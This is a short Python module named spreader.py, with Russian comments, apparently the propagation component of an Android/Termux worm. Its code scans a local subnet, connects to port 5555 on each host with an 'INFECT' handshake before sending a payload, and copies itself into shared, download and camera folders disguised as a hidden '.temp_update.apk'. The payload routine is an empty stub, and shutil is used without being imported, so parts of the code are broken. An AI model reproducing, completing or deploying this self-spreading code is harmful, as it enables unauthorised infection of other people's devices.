# modules/spreader.py
import os
import socket
from concurrent.futures import ThreadPoolExecutor
from ipaddress import IPv4Network

class Spreader:
    def __init__(self):
        self.usb_path = self._get_termux_storage_paths()
        self.executor = ThreadPoolExecutor(max_workers=20)

    def _get_termux_storage_paths(self):
        """Получение разрешенных путей в Termux"""
        base = os.path.expanduser('~/storage')
        return [
            os.path.join(base, p)
            for p in ['shared', 'downloads', 'dcim']
            if os.path.exists(os.path.join(base, p))
        ]

    def spread_via_network(self, subnet="192.168.1.0/24"):
        """Сканирование сети и распространение"""
        for ip in self._scan_subnet(subnet):
            self.executor.submit(self._try_infect, ip)

    def _scan_subnet(self, subnet):
        """Сканирование подсети"""
        try:
            network = IPv4Network(subnet)
            return [str(host) for host in network.hosts()]
        except:
            return []

    def _try_infect(self, ip):
        """Попытка заражения через открытые порты"""
        try:
            with socket.socket() as s:
                s.settimeout(2)
                s.connect((ip, 5555))  # Пример порта
                s.send(b"INFECT")
                if s.recv(1024) == b"ACK":
                    self._send_payload(ip)
        except:
            pass

    def _send_payload(self, ip):
        """Отправка полезной нагрузки"""
        # Реализация зависит от вашего протокола
        pass

    def spread_via_usb(self):
        """Распространение через USB"""
        for path in self.usb_path:
            try:
                target = os.path.join(path, ".temp_update.apk")
                shutil.copy(__file__, target)
            except:
                continue